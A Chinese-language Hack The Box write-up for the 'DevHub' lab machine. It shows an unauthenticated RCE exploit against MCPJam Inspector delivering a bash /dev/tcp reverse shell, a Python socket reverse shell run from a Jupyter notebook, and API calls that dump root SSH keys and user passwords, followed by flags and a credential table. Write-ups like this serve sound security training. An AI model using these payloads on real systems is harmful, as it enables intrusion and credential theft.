# HTB DevHub 渗透测试详细 Writeup (2026-06-01)

## 目标信息
- **IP**: 10.129.104.247
- **域名**: devhub.htb
- **平台**: Hack The Box 授权靶场
- **授权范围**: 全 IP，无限制
- **难度**: Medium
- **状态**: ✅ 全部完成

---

## 1. 信息搜集

### 1.1 端口扫描
```bash
nmap -sV -sC -T4 10.129.104.247
```

**开放端口**:
| 端口     | 服务 | 版本                             | 备注        |
| -------- | ---- | -------------------------------- | ----------- |
| 22/tcp   | SSH  | OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 | 标准        |
| 80/tcp   | HTTP | nginx 1.18.0 (Ubuntu)            | DevHub 平台 |
| 6274/tcp | HTTP | Node.js (MCPJam Inspector)       | 重点目标    |

### 1.2 Web 枚举
- **80端口**: DevHub - Internal Development Platform
- **6274端口**: MCPJam Inspector v1.4.2 (React SPA)

### 1.3 JS 文件分析
从前端 `/assets/index-DRYhT9Xb.js` 提取到 40+ 个 API 端点:
- `/api/mcp/chat`, `/api/mcp/chat-v2` - 聊天接口
- `/api/mcp/tools/execute` - 工具执行
- `/api/mcp/servers` - 服务器管理
- `/api/mcp/oauth/debug/proxy` - 调试代理
- `/api/mcp/evals/*` - 评估/测试生成

---

## 2. 初始访问 (CVE-2026-23744)

### 2.1 漏洞发现
- **漏洞**: MCPJam Inspector 1.4.2 未认证 RCE
- **CVE**: CVE-2026-23744
- **位置**: `/api/mcp/connect` 端点

### 2.2 漏洞利用
```bash
# 利用代码示例
curl -X POST http://10.129.104.247:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d '{"command":"bash -c \"bash -i \u003e\u0026 /dev/tcp/10.10.16.7/4444 0\u003e\u00261\""}'
```

### 2.3 获取 Shell
```bash
# Kali 监听
nc -lvnp 4444

# 连接结果
connect to [10.10.16.7] from (UNKNOWN) [10.129.104.247] 48160
bash: cannot set terminal process group (1086): Inappropriate ioctl for device
bash: no job control in this shell
mcp-dev@devhub:/opt/mcpjam/node_modules/@mcpjam/inspector$
```

---

## 3. 横向移动 (Jupyter → analyst)

### 3.1 发现 Jupyter Notebook
```bash
# 查看进程
ps aux | grep jupyter

# 结果
analyst 1085 0.0 2.4 181512 96612 ? Ss 02:41 0:06 /home/analyst/jupyter-env/bin/python3 /home/analyst/jupyter-env/bin/jupyter-lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### 3.2 提取 Jupyter Token
从进程参数中提取到 Token:
```
a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7
```

### 3.3 设置 SSH 端口转发
```bash
# 在 mcp-dev shell 中生成 SSH 密钥
ssh-keygen -t ed25519 -f /tmp/id_ed25519 -N ""
cat /tmp/id_ed25519.pub >> ~/.ssh/authorized_keys

# 在 Kali 上连接
ssh -i id_ed25519 -L 8888:127.0.0.1:8888 mcp-dev@10.129.104.247
```

### 3.4 通过 Jupyter Notebook 获取 analyst Shell
```bash
# 浏览器访问
http://127.0.0.1:8888/lab?token=a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7

# 在 Notebook cell 中执行反向 shell
import socket, subprocess, os
s = socket.socket()
s.connect(('10.10.16.7', 4445))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(['/bin/bash', '-i'])
```

### 3.5 获取 analyst Shell
```bash
# Kali 监听
nc -lvnp 4445

# 连接结果
connect to [10.10.16.7] from (UNKNOWN) [10.129.104.247] 54008
analyst@devhub:~/notebooks$
```

---

## 4. 权限提升 (OPSMCP → root)

### 4.1 发现 OPSMCP 服务
```bash
# 查看进程
ps aux | grep opsmcp

# 结果
root 1091 0.0 0.7 37376 28828 ? Ss 02:41 0:03 /home/analyst/jupyter-env/bin/python3 /opt/opsmcp/server.py
```

### 4.2 读取 OPSMCP API Key
```bash
cat ~/.opsmcp_key

# 结果
opsmcp_secret_key_4f5a6b7c8d9e0f1a
```

### 4.3 分析 OPSMCP 代码
从 `/opt/opsmcp/server.py` 发现:
- **API Key**: `opsmcp_secret_key_4f5a6b7c8d9e0f1a`
- **隐藏工具**: `ops._admin_dump` - 可读取 root SSH key
- **端口**: 127.0.0.1:5000

### 4.4 获取 root SSH Key
```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'

# 结果包含 root_private_key
```

### 4.5 获取 root 密码 Hash
```bash
curl -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"passwords","confirm":true}}'

# 结果
{"dump":{"analyst":"JupyterN0tebook!2026","mcp-dev":"Mcp!Insp3ct0r2026","root":"$6$rounds=656000$saltsalt$hashedpassword"},"target":"passwords"}
```

### 4.6 SSH 登录 root
```bash
# 保存 SSH key
cat > /tmp/root_id_rsa << 'EOF'
-----BEGIN OPENSSH PRIVATE KEY-----
...redacted...
-----END OPENSSH PRIVATE KEY-----
EOF
chmod 600 /tmp/root_id_rsa

# SSH 登录
ssh -i /tmp/root_id_rsa root@127.0.0.1

# 结果
Welcome to Ubuntu 22.04.5 LTS
root@devhub:~# id
uid=0(root) gid=0(root) groups=0(root)
```

---

## 5. 获取 Flags

### 5.1 user.txt
```bash
cat /home/analyst/user.txt
a57f2a7fcedbf23951d891dc809a4320
```

### 5.2 root.txt
```bash
cat /root/root.txt
6f001bbe976f003cf56599fcd0455703
```

---

## 6. 攻击链总结

```
CVE-2026-23744 (MCPJam Inspector 未认证 RCE)
  → POST /api/mcp/connect
  → mcp-dev shell
  → 发现 Jupyter Notebook (127.0.0.1:8888)
  → 提取 Token (进程参数)
  → SSH 端口转发
  → Notebook cell 执行反向 shell
  → analyst shell
  → 发现 OPSMCP API (127.0.0.1:5000)
  → 读取 API Key (~/.opsmcp_key)
  → 调用 ops._admin_dump 获取 root SSH key
  → SSH 登录 root
  → ROOT
```

---

## 7. 发现的凭证

| 服务    | 用户名  | 密码/Key                                 | 来源          |
| ------- | ------- | ---------------------------------------- | ------------- |
| Jupyter | -       | a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7 | 进程参数      |
| OPSMCP  | admin   | opsmcp_secret_key_4f5a6b7c8d9e0f1a       | ~/.opsmcp_key |
| 系统    | root    | SSH key                                  | OPSMCP API    |
| 系统    | analyst | JupyterN0tebook!2026                     | OPSMCP API    |
| 系统    | mcp-dev | Mcp!Insp3ct0r2026                        | OPSMCP API    |
